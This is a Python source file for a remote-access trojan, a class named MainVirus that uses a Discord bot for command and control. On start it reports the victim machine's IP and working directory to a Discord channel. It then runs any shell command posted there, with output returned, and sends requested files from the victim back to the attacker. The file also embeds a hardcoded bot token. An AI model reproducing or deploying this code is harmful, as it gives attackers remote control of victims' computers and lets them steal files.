import lightbulb, hikari, asyncio, os, random, socket, subprocess, \
    sys, requests, json  # installs the import we will need for making the bot
from parser import Parser
from requests_toolbelt.multipart.encoder import MultipartEncoder
from pathlib import Path
import base64


class MainVirus:  # Making a class to wrap code cause organisation
    def __init__(self):  # initialisation function
        self.bot = self.make_connection()  # Creates the discord bot
        self.id = self.make_id()  # Contains the id of the victim's computer
        self.channel_id = None  # Contains the channel id (Used to send messages)
        self.cwd = os.getcwd()  # Contains the cwd of the victim
        self.funList = {  # Holds all the commands
            "exit": self.exit,
            "cdir": self.cd,
            "dog": self.cat,
        }

    def run(self):  # runs the program
        self.connectionSetUp()  # Sets up a connection with discord servers
        self.commands()  # Checks for discord commands and other events
        self.bot.run()  # Runs the bot (Makes it online)

    def make_connection(self):  # makes a connection to the discord servers
        try:  # I use a try method cause the person might not have an internet connection when computer booted
            return lightbulb.BotApp( # Makes the Discord Bot
                token="OTg1ODU1NTYwMDMxMjkzNDQy.GkeK8U.11OUYRHcS5Zevhu3B8QrMDZ6HdRgJZtDOZdEcY",  # Sets the token for the bot
                default_enabled_guilds=985853825166475284)  # I connect the bot to the discord servers using our bots token
        except:  # what to do if connection fails
            self.make_connection()  # I run the program again if the connection fails

    def make_id(self):  # This Function makes a unique id for each victim
        return random.randint(100, 999)

    def connectionSetUp(self):  # Gets discord ready for rshell
        @self.bot.listen(hikari.StartedEvent)  # Listens for a start event
        async def onStart(event):
            await self.bot.rest.create_message(  # Sends the alert of connection
                985853985577635910,
                f"{'-' * 20}\n"
                f"@everyone **CONNECTION MADE :P**\n"
                f"**ID: **||{self.id}||\n"
                f"**IP: **||{socket.gethostbyname(socket.gethostname())}||\n"
                f"**CWD: **||{os.getcwd()}||\n"
                f"{'-' * 20}\n"
            )
            await self.bot.rest.create_guild_text_channel(name=str(self.id), guild=985853825166475284)  # Makes the Shell Channel

    def commands(self):
        @self.bot.command  # Makes the "test" command
        @lightbulb.command("test", "testing command")
        @lightbulb.implements(lightbulb.SlashCommand)
        async def ping(ctx):
            await ctx.respond("working")  # Sends a message - "working"

        @self.bot.listen(hikari.GuildMessageCreateEvent)  # Check messages for commands
        async def onMessage(event):
            if event.content == str(self.id):  # Checks for channel initialisation
                self.channel_id = event.channel_id  # Sets the shell channel to the one selected
            if event.channel_id == self.channel_id and str(event.author) != "rshellbot#7986":  # Checks if the message is in the shell channel and checks if the message wasn't sent by the bot
                await self.bot.rest.create_message(self.channel_id, self.giveMessage(event))  # Sends the output of the message

    def giveMessage(self, event):  # Returns output of message
        if self.readInput(event.content, event):  # Checks if output is not None
            return self.readInput(event.content, event)  # Returns output
        elif self.readInput(event.content, event) != "":  # Checks if output is not ""
            return self.readInput(event.content, event)  # Returns output
        else:
            return "[no_output]"  # Returns no output tag

    def cat(self, syntax):  # Cat command - Returns the selected file
        @self.bot.listen(hikari.GuildMessageCreateEvent)  # Message Sent Event
        async def onConfirm(event):  # Creates the event function - runs on event
            if self.isCommandConfirm(event, "dog"):  # Checks for confirmation
                await self.bot.rest.create_message(self.channel_id, f"Sending File: {syntax[0]}")  # Sends information message - sends file name
                fileLoc = os.path.join(self.cwd, syntax[0])  # Sets the file loc
                await self.bot.rest.create_message(self.channel_id, hikari.File(fileLoc))  # Sends File

    def exit(self, syntax):  # Exit command - Closes connection
        @self.bot.listen(hikari.GuildMessageCreateEvent)  # Message sent event
        async def onConfirm(event):  # Creates the event function - runs at event
            if self.isCommandConfirm(event, "exit"):  # Checks for confirmation
                await self.bot.rest.create_message(self.channel_id, "Closing Connection")  # Sends "Closing Connection" message
                await self.bot.rest.create_message(  # Creates "Connection Lost" Alert
                    985853985577635910,
                    f"{'-' * 20}\n"
                    f"@everyone **CONNECTION LOST :(**\n"
                    f"**ID: **||{self.id}||\n"
                    f"**IP: **||{socket.gethostbyname(socket.gethostname())}||\n"
                    f"**CWD: **||{os.getcwd()}||\n"
                    f"{'-' * 20}\n"
                )
                await self.bot.rest.delete_channel(self.channel_id)  # Deletes the connection channel
                sys.exit()  # Program stops

    def isCommandConfirm(self, event, keyword):  # Checks for confirmation
        if event.channel_id == self.channel_id and str(event.author) != "rshellbot#7986" and event.content == keyword:  # checks if sent message is in the right channel, checks if the message is from a user and check if message is keyword
            return True
        else:
            return False

    def cd(self, syntax):  # Cd command - changes the current dir
        @self.bot.listen(hikari.GuildMessageCreateEvent)  # Message sent event
        async def onConfirm(event):  # Runs on event activation
            if self.isCommandConfirm(event, "cdir"):  # Checks for confirmation
                self.cwd = syntax[0]  # Sets the cwd to the loc specified
                await self.bot.rest.create_message(self.channel_id, f"Set cwd to {self.cwd}")  # Sends message saying the cwd

    def readInput(self, inpit, event):  # Used to read user input
        def out(command):  # Used to run shell commands
            result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True,
                                    shell=True, cwd=self.cwd)  # Runs shell commands
            return result.stdout  # Returns output of command

        if str(inpit).__contains__("<"):  # Checks if input is a command
            fun = inpit.strip("<")  # Removes the command initiator
            parsed = Parser(fun).run()  # Parses the input into data
            self.funList[parsed[0]](parsed[1])  # Runs the command specified
            return "[running command]"  # Returns message - "[running command]"
        else:
            return out(inpit)  # Runs shell command and returns output


MainVirus().run()  # Starts program
